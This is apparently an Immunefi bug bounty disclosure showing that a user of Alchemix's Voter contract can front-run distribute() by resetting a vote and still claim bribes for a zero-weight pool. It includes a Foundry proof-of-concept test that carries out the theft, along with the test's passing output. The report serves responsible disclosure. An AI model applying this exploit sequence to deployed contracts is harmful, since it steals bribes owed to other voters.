# 31085 - \[SC - Critical] Malicious users can front-run the distribution ...

Submitted on May 12th 2024 at 14:17:54 UTC by @Ch301 for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31085

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Theft of unclaimed royalties

## Description

## Brief/Intro

The pool weight is zero but users are still able to claim bribes.

## Vulnerability Details

First, let's understand two main points:

1- When a user invokes `Voter.sol#vote()`\[#1] will update `lastVoted[_tokenId]` to `block.timestamp`

```solidity
File: Voter.sol

508:         lastVoted[_tokenId] = block.timestamp;

```

Users to be able to reset the voting status, need to call `Voter.sol#reset()`. However, the modifier `onlyNewEpoch()` will force the user to wait until a new epoch starts since the last vote. So user can call `reset()` at the first second of the new epoch.

```solidity
File: Voter.sol

110:         require((block.timestamp / DURATION) * DURATION > lastVoted[_tokenId], "TOKEN_ALREADY_VOTED_THIS_EPOCH");

```

2- To distribute rewards and bribes to all gauges you need to call `Voter.sol#distribute()` only once per epoch. (Normally this is done by off-chain bots)

```solidity
File: Voter.sol

408:     function _distribute(address _gauge) internal {
409:        
410:         // Distribute once after epoch has ended
411:         require(
412:             block.timestamp >= IMinter(minter).activePeriod() + IMinter(minter).DURATION(),
413:             "can only distribute after period end"
414:         );

```

Now, the first point updates all the related values, but the `Bribe.sol#withdraw()` will create a new checkpoint `X` (see: `_writeCheckpoint()`\[#2]) this checkpoint get considered for the new epoch not the last epoch.

Next time the user calls `voter.sol#claimBribes()`. the `balanceOf` of the epoch `X - 1` will allow the user to claim all/part from the bribes even if he didn't help the gauge to generate more emrssions

```solidity
File: Bribe.sol
232:     function earned(address token, uint256 tokenId) public view returns (uint256) {
        /***/
262:                 if (_nextEpochStart > prevRewards.timestamp) {
263:                     reward += prevRewards.balanceOf;
264:                 }

```

## Impact Details

1- If the malicious user is the only one who votes to a gauge, He will claim all the bribes if they exist and the pool will receive zero emissions.

2- If there are multiple users vote for that particular pool, the malicious user will steal a part from other user's bribes.

## References

\#1: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L449>

\#2: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol?utm\\_source=immunefi#L351-L360>

## Proof of Concept

Foundry PoC:

1. Please copy the following PoC in `Voting.t.sol`

```solidity
    function test_bribes_poc_01() public {
        {//set up
            uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);

            address bribeAddress = voter.bribes(address(sushiGauge));

            address[] memory pools = new address[](1);
            pools[0] = sushiPoolAddress;
            uint256[] memory weights = new uint256[](1);
            weights[0] = 5000;

            address[] memory bribes = new address[](1);
            bribes[0] = address(bribeAddress);
            address[][] memory tokens = new address[][](1);
            tokens[0] = new address[](1);
            tokens[0][0] = bal;

            // in epoch i, user votes with balance x
            hevm.prank(admin);
            voter.vote(tokenId1, pools, weights, 0);

            // Start epoch
            hevm.warp(newEpoch());
            voter.distribute();
        }

        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        /*@audit you can call `distribute()`only starting from `IMinter(minter).activePeriod() + IMinter(minter).DURATION()` */
        // Start second epoch. this is the first second of the second epoch.
        hevm.warp(newEpoch() - 1);
        //! user front-run the `distribute()` transaction 
        hevm.prank(admin);
        voter.reset(tokenId1);

        //! weight is zero
        uint weight = voter.weights(sushiPoolAddress);
        assertEq(weight, 0);

        voter.distribute();

        uint256 balanceStart = IERC20(bal).balanceOf(admin);

        // Claim bribes from epoch i
        hevm.warp(block.timestamp + 100);
        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);
        uint256 balanceEnd = IERC20(bal).balanceOf(admin);
        
        //! weight is zero but the user still able to claim the bribes
        assertGt(balanceEnd, balanceStart);
    }
```

2. Test result:

```diff
Ran 1 test for src/test/Voting.t.sol:VotingTest
[PASS] test_bribes_poc_01() (gas: 3792050)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 52.46s (37.28s CPU time)

Ran 1 test suite in 54.39s (52.46s CPU time): 1 tests passed, 0 failed, 0 skipped 
(1 total tests)
```
